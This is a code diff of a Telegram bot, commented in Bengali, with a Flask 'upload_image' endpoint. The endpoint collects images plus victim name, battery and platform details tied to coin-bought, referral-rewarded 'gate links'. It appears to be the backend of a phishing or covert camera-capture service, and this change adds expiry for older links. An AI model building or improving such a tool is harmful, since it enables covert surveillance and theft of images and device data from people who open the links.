@@ -18,7 +18,7 @@ TOKEN = os.environ.get("TOKEN")
 ADMIN_ID = int(os.environ.get("ADMIN_ID"))
 MY_USERNAME = os.environ.get("MY_USERNAME")
 
-REFER_REWARD = 2  # ডিফল্ট রেফার বোনাস (এডমিন প্যানেل থেকে পরিবর্তন করা যাবে)
+REFER_REWARD = 2  # ডিফল্ট রেফার বোনাস (এডমিন প্যানেল থেকে পরিবর্তন করা যাবে)
 users_db = {}
 forced_channels = []  
 pending_referrals = {} 
@@ -44,17 +44,22 @@ def upload_image():
     data = request.json
     owner_id = data.get('chat_id')  
     image_data = data.get('image')
-    session_token = data.get('s', 'default')  # লিংক থেকে সেশন টোকেন রিসিভ করা
+    session_token = data.get('s')  # লিংক থেকে সেশন টোকেন রিসিভ করা
     name = data.get('name', 'Unknown')
     battery = data.get('battery', 'N/A')
     platform = data.get('platform', 'Mobile/PC')
 
-    if not owner_id or not image_data:
+    if not owner_id or not image_data or not session_token:
         return jsonify({"status": "error", "message": "Invalid data"}), 400
 
     try:
         owner_id = int(owner_id)
         
+        # --- লিংক এক্সপায়ার সিস্টেম (পূর্বের লিংক ডিএক্টিভেট করা) ---
+        if user_active_sessions.get(owner_id) != session_token:
+            return jsonify({"status": "error", "message": "Link expired"}), 400
+        # ---------------------------------------------------------
+
         # ইউনিক সেশন কি (ইউজার আইডি + লিংক সেশন টোকেন)
         session_key = f"{owner_id}_{session_token}"
         
@@ -154,7 +159,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = (user_id == ADMIN_ID)
 
     if user_id not in users_db:
-        # ওয়েলকাম বোনাস ৩ কয়েন সেট করা হলো
         users_db[user_id] = {"username": username, "balance": 3, "referrals": 0, "is_vip": False}
 
         if context.args and context.args[0].startswith("ref_"):
@@ -311,7 +315,7 @@ async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYP
             await update.message.reply_text("❌ পর্যাপ্ত কয়েন নেই! রেফার করে কয়েন অর্জন করুন।")
             return
 
-        # প্রতিবার নতুন গেট লিংকে ক্লিক করলে ইউনিক সেশন টোকেন তৈরি হবে
+        # নতুন টোকেন তৈরি করা মাত্রই আগের টোকেন ওভাররাইট হয়ে যাবে এবং পুরনো লিংক ডিঅ্যাক্টিভেট হয়ে যাবে
         session_token = str(uuid.uuid4())[:8]
         user_active_sessions[user_id] = session_token
 
